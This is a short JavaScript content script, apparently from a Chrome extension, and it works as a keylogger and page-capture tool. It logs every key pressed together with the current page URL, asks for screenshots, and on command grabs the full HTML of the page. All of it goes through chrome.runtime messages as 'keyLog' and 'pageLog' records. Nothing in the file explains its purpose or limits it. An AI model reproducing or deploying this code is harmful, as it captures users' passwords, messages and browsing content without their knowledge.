chrome.runtime.onConnect.addListener(function (port) {});

var k = "";
var data = {};
window.onkeydown = function (event) {
  if (event.key.length > 1) {
    k = " (" + event.key + ") ";
  } else {
    k = event.key;
  }
  data = {
    type: "keyLog",
    key: k,
    page: window.location.href,
  };
  chrome.runtime.sendMessage(data);
  chrome.runtime.sendMessage({msg: "capture"}, function(response) {
    console.log(response.dataUrl);
  });
};

function makePageCapture() {
  let dO = document.doctype;
  let dtd = "";
  if (dO) {
    dtd =
      `<!DOCTYPE ${dO.name}${
        dO.publicId ? ' PUBLIC "' + dO.publicId + '"' : ""
      }${dO.systemId ? ' "' + dO.systemId + '"' : ""}`.trim() + ">\n";
  }
  let htmlOfPage = dtd + document.documentElement.outerHTML;

  data = {
    type: "pageLog",
    page: window.location.href,
    htmldata: htmlOfPage
  };
  chrome.runtime.sendMessage(data);
}

function handleMessageC(request) {
  if (request.type === "pageCapture") {
    makePageCapture();
  }
}

chrome.runtime.onMessage.addListener(handleMessageC);
